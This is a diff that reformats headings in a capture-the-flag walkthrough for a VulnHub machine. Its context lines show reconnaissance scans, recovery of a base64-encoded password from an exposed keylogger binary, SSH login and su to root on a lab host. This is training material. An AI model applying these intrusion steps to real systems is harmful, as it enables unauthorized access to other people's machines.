@@ -4,9 +4,7 @@
 Available on VulnHub: https://www.vulnhub.com/entry/who-wants-to-be-king-1,610/
 
 
-## Walkthrough
-
-### IP Discovery
+## IP Discovery
 
 ```
 $ sudo netdiscover -r 192.168.1.0/16
@@ -29,7 +27,7 @@ xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
-### Port Scanning
+## Port Scanning
 
 ```
 $ nmap -AT4 -p- 192.168.1.183
@@ -59,7 +57,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 8.33 seconds
 ```
 
-### Web Analysis
+## Web Analysis
 
 ```
 $ nikto -h http://192.168.1.183
@@ -95,7 +93,7 @@ $ nikto -h http://192.168.1.183
 + 1 host(s) tested
 ```
 
-### Downloading Exposed File
+## Downloading Exposed File
 
 ```
 $ wget http://192.168.1.183/skeylogger
@@ -109,7 +107,7 @@ skeylogger                    100%[=============================================
 2020-12-19 19:23:34 (79.1 MB/s) - ‘skeylogger’ saved [31416/31416]
 ```
 
-### Analysing KeyLogger File
+## Analysing KeyLogger File
 
 ```
 $ strings skeylogger | less
@@ -128,7 +126,7 @@ echo "ZHJhY2FyeXMK" | base64 -d
 dracarys
 ```
 
-### SSH Login
+## SSH Login
 
 ```
 $ ssh daenerys@192.168.1.183
@@ -139,7 +137,7 @@ daenerys@osboxes:~$ id
 uid=1001(daenerys) gid=1001(daenerys) groups=1001(daenerys)
 ```
 
-### Daenerys User Exploration
+## Daenerys User Exploration
 
 ```
 daenerys@osboxes:~$ cat /home/daenerys/secret
@@ -160,7 +158,7 @@ drwxr-xr-x 2 daenerys daenerys 4.0K Dec  1 10:58 gnote
 drwx------ 2 daenerys daenerys 4.0K Dec  1 11:12 nano
 ```
 
-### Suspicious File Analysis
+## Suspicious File Analysis
 
 ```
 $ scp daenerys@192.168.1.183:/home/daenerys/.local/share/daenerys.zip .
@@ -180,7 +178,7 @@ daenerys@osboxes:~$ cat /usr/share/sounds/note.txt
 I'm khal.....
 ```
 
-### Privilege Escalation
+## Privilege Escalation
 
 ```
 daenerys@osboxes:~$ su root
@@ -190,7 +188,7 @@ root@osboxes:/home/daenerys# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-### Root Flag
+## Root Flag
 
 ```
 root@osboxes:~# cat /root/nice.txt 
